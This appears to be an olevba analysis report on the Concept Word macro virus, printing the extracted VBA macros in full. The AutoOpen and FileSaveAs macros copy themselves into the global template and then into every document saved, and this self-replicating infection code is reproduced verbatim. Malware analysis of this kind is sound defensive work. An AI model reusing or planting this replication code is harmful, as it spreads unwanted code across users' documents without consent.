olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept-57cf9f6f50cdc0ea47cf924c14989c46e0be7520
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept-57cf9f6f50cdc0ea47cf924c14989c46e0be7520 - OLE stream: '2/Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Concept-57cf9f6f50cdc0ea47cf924c14989c46e0be7520 - OLE stream: '2/Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
Dim bTooMuchTrouble
Dim iWW6IInstance
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    'see if we're already installed
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "PayLoad" Then
            bInstalled = -1
        End If
        If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
            bTooMuchTrouble = -1
        End If
    Next i
    If Not bInstalled And Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        'PayLoad is just for fun.
        iWW6IInstance = WordBasic.Val(WordBasic.[GetDocumentVar$]("WW6Infector"))
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":Payload"
        WordBasic.MacroCopy sMacro$, "Global:PayLoad"
        sMacro$ = sMe$ + ":AAAZFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":AAAZFS"
        WordBasic.MacroCopy sMacro$, "Global:AAAZFS"
        sMacro$ = sMe$ + ":AAAZAO"
        WordBasic.MacroCopy sMacro$, "Global:AAAZAO"
        WordBasic.SetProfileString "WW6I", Str(iWW6IInstance + 1)
        WordBasic.MsgBox Str(iWW6IInstance + 1)
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AAAZAO.bas 
in file: Virus.MSWord.Concept-57cf9f6f50cdc0ea47cf924c14989c46e0be7520 - OLE stream: '2/Macros/VBA/AAAZAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
Dim bTooMuchTrouble
Dim iWW6IInstance
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    'see if we're already installed
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "PayLoad" Then
            bInstalled = -1
        End If
        If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
            bTooMuchTrouble = -1
        End If
    Next i
    If Not bInstalled And Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        'PayLoad is just for fun.
        iWW6IInstance = WordBasic.Val(WordBasic.[GetDocumentVar$]("WW6Infector"))
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":Payload"
        WordBasic.MacroCopy sMacro$, "Global:PayLoad"
        sMacro$ = sMe$ + ":AAAZFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":AAAZFS"
        WordBasic.MacroCopy sMacro$, "Global:AAAZFS"
        sMacro$ = sMe$ + ":AAAZAO"
        WordBasic.MacroCopy sMacro$, "Global:AAAZAO"
        WordBasic.SetProfileString "WW6I", Str(iWW6IInstance + 1)
        WordBasic.MsgBox Str(iWW6IInstance + 1)
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AAAZFS.bas 
in file: Virus.MSWord.Concept-57cf9f6f50cdc0ea47cf924c14989c46e0be7520 - OLE stream: '2/Macros/VBA/AAAZFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AAAZAO", sTMacro$
sTMacro$ = sMe$ + ":AAAZAO"
WordBasic.MacroCopy "Global:AAAZAO", sTMacro$
sTMacro$ = sMe$ + ":AAAZFS"
WordBasic.MacroCopy "Global:AAAZFS", sTMacro$
sTMacro$ = sMe$ + ":PayLoad"
WordBasic.MacroCopy "Global:PayLoad", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PayLoad.bas 
in file: Virus.MSWord.Concept-57cf9f6f50cdc0ea47cf924c14989c46e0be7520 - OLE stream: '2/Macros/VBA/PayLoad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem That's enough to prove my point
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

